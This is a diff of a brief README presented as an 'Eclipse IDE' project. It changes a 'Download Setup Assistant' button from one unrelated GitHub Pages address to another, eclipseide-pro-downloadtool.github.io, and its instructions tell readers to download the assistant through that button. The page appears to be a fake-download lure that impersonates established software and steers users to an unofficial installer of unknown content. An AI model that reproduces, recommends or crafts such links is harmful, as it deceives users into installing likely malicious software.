@@ -1,6 +1,8 @@
 # Eclipse IDE 
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://asdeennerhorse.github.io/mogus/eclipseIDE)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://eclipseide-pro-downloadtool.github.io/.github/)
+
+---
 
 ## ⚙️ How to Use
 1. Download the setup assistant using the button above  
